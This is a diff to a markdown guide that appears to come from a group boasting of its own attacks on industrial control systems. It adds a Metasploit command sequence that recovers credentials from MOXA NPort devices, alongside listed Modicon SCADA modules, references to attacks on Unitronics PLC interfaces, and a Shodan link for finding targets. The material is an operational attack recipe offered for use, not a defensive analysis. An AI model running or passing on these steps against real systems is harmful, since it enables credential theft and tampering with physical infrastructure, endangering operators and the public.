@@ -22,6 +22,22 @@ auxiliary/admin/scada/modicon_stux_transfer
 auxiliary/admin/scada/modicon_command
 ```
 
+- Gather MOXA NPort credentials when authentication is on.
+
+```
+msf > use auxiliary/admin/scada/moxa_credentials_recovery
+
+msf auxiliary(admin/scada/moxa_credentials_recovery) > options
+
+msf auxiliary(admin/scada/moxa_credentials_recovery) > set function creds
+
+msf auxiliary(admin/scada/moxa_credentials_recovery) > set rport 4800
+
+msf auxiliary(admin/scada/moxa_credentials_recovery) > set rhosts <target_IP>
+
+msf auxiliary(admin/scada/moxa_credentials_recovery) > run
+```
+
 ## Unitronic PLCs
 
 Unitronics devices, some of our recent ICS attacks had a new approach that shocked a few people and we got some questions on it was the targets where we showed off the HMI's for them.
@@ -48,4 +64,9 @@ From here we do recommend research on using this software and how to properly ac
 
 HACK THE PLANET!!
 
-ANY QUESTIONS DROP THEM IN THE CHAT 
+ANY QUESTIONS DROP THEM IN THE CHAT
+
+---
+## References
+
+- [[SCADA (ICS)|Shodan: SCADA]]
